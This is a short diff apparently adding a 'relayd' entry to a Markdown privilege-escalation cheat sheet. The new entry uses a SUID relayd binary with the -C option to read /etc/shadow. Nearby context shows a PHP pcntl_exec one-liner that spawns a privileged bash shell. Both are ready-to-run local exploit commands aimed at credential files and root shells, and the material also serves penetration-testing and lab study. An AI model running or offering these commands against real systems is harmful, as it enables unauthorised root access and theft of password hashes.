@@ -3526,6 +3526,16 @@ export PATH=$(pwd):$PATH
 /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
 ```
 
+##### relayd
+
+###### Prerequisites
+
+The binary need to have the `SUID` bit set.
+
+```c
+/usr/sbin/relayd -C /etc/shadow
+```
+
 ##### Shared Library Misconfiguration
 
 > https://tbhaxor.com/exploiting-shared-library-misconfigurations/
